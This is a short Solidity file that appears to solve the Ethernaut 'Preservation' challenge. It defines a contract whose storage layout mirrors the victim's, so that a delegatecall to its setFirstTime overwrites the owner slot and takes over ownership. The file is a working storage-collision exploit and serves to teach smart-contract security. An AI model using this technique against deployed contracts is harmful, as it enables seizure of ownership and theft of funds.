// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IPreservation {
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) external ;

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) external;
}

// Point the timeZone1Library address to this contract
contract AttackPreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    constructor() public {}

    // underhand claim level
    function setFirstTime(uint _timeStamp) public {
        owner = address(_timeStamp);
    }
}